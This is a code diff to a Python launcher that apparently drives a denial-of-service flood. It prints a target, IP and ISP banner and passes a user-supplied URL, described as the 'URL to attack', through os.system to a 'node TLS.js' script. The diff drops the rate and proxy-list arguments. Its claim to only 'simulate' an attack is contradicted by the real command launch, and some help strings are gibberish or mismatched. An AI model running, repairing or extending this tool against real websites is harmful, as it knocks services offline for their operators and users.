@@ -56,7 +56,6 @@ def main(url, threads, time, methods):
     print(f"        \x1b[38;2;233;233;233mTARGET  : [ \x1b[38;2;0;255;255m{args.target} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mIP      : [ \x1b[38;2;0;255;255m{ip_address} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mISP     : [ \x1b[38;2;0;255;255m{isp_info} \x1b[38;2;233;233;233m]")
-    print(f"        \x1b[38;2;233;233;233mRPS     : [ \x1b[38;2;0;255;255m{args.rate} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mTHREADS : [ \x1b[38;2;0;255;255m{args.threads} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mTIME    : [ \x1b[38;2;0;255;255m{args.time} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255mRAZ \x1b[38;2;233;233;233m]")
@@ -68,12 +67,11 @@ def main(url, threads, time, methods):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Simulate an attack command.')
     parser.add_argument('target', type=str, help='URL to attack')
-    parser.add_argument('time', type=int, help='Time duration of attack')
-    parser.add_argument('rate', type=int, help='anjiwie')
-    parser.add_argument('threads', type=int, help='itiskkdu')
+    parser.add_argument('threads', type=int, help='Time duration of attack')
+    parser.add_argument('time', type=int, help='anjiwie')
 
     args = parser.parse_args()
 
-    os.system(f'node TLS.js {args.target} {args.time} {args.rate} {args.threads} proxies.txt')
-
-    main(args.target, args.time, args.rate, args.threads)
+    os.system(f'node TLS.js {args.target} {args.threads} {args.time}')
+    
+    main(args.target, args.threads, args.time)
